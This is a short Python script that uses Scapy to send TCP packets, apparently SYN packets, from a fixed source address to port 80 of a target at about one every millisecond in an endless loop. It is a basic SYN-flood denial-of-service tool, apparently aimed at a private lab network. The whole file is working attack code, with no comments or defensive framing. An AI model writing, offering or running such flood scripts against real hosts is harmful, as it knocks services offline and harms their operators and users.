from scapy.all import *
import scapy


source_IP = "192.168.56.10"
target_IP = "192.168.56.20"
source_port = 8000
i = 1
while True:
    IP1 = IP(src = source_IP, dst = target_IP)
    TCP1 = TCP(sport = source_port, dport = 80)
    pkt = IP1 / TCP1
    send(pkt, inter = .001)
    print ("packet sent ", i)
    i = i + 1